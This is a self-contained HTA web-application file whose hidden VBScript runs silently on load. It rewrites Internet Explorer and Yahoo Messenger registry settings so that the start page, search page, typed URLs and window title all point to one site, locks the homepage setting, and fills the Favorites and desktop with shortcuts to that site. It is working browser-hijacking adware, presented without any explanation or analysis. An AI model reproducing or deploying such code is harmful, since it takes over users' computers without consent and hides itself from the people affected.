<html>
<HTA:APPLICATION caption="no" border="none" windowState="minimize" visiable="no" showintaskbar="no">
<body onload="window.blur();">
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
on error resume next
window.moveTo -1000,-1000
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://hocsinhvip.info" 
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url4","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Yahoo\Pager\View\YMSGR_Calendar\content url","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Yahoo\Pager\View\YMSGR_Games\content url","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Yahoo\Pager\View\YMSGR_Launchcast\content url","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Yahoo\Pager\View\YMSGR_Weather\content url","http://hocsinhvip.info"
wsh.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","0","REG_DWORD"


wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","0","REG_DWORD"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", ".:: wWw.HocSinhVip.Info -=o0o=- wWw.TinhBangGiaClub.Tk ::.| Music Phu Yen Online | Tình Yeu | Giai tri |"
window.close
</script>
<script LANGUAGE="VBScript">
on error resume next 
Call LongFei_AddFavorites("http://ongame.com.vn","http://hocsinhvip.info") 
Call LongFei_AddFavorites("==[ Phopro+Vip_Hot]==","http://hocsinhvip.info") 
Call LongFei_AddFavorites("==[ Nghe Nhac Online ]==","http://hocsinhvip.info")
Call LongFei_AddFavorites("Website Nghe nhac Online","http://hocsinhvip.info")
Call LongFei_AddFavorites("The Thao Giai Tri","http://hocsinhvip.info")
Call LongFei_AddFavorites("Danh ba web hay","http://hocsinhvip.info") 
Call LongFei_AddFavorites("Nghe nhac truc tuyen","http://hocsinhvip.info")
Call LongFei_AddFavorites("Music Online","http://hocsinhvip.info") 
Call LongFei_AddFavorites("Hot Music (Dance)","http://hocsinhvip.info") 
Call LongFei_AddFavorites("Rap Viet","http://hocsinhvip.info")
Call LongFei_AddFavorites("Avartar","http://hocsinhvip.info")
Call LongFei_AddFavorites("Thu Thuat Yahoo","http://hocsinhvip.info")   
Call LongFei_AddFavorites("Tinh Yeu Cuoc Song","http://hocsinhvip.info") 
Call LongFei_AddFavorites("Tro choi truc tuyen","http://hocsinhvip.info")  
Call LongFei_AddFavorites("Tin the thao","http://hocsinhvip.info") 
Call LongFei_AddFavorites("Ket qua bong da","http://hocsinhvip.info") 
Call LongFei_AddFavorites("The gioi Anh Dep","http://hocsinhvip.info")  
Call LongFei_AddFavorites("Quang Cao Online","http://hocsinhvip.info") 

on error resume next 
Call LongFei_AddDesktop("Nghe nhac Online ","http://hocsinhvip.info") 
Call LongFei_AddDesktop("Tinh Yeu Cuoc Song ","http://hocsinhvip.info") 
on error resume next 
Call LongFei_AddQuickLaunch("Internet Explorer","http://hocsinhvip.info") 
Function LongFei_AddFavorites(N, U) 
on error resume next 
Set S = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/" + N +".URL") 
S.TargetPath = U 
S.Save() 
End Function 
Function LongFei_AddDesktop(N, U) 
on error resume next 
Set S = wsh.CreateShortcut(wsh.SpecialFolders("AllUsersDesktop") + "/" + N +".URL") 
S.TargetPath = U 
S.Save() 
End Function 
</script>
<script language="javascript">
window.close();
</script>
</body>
</html>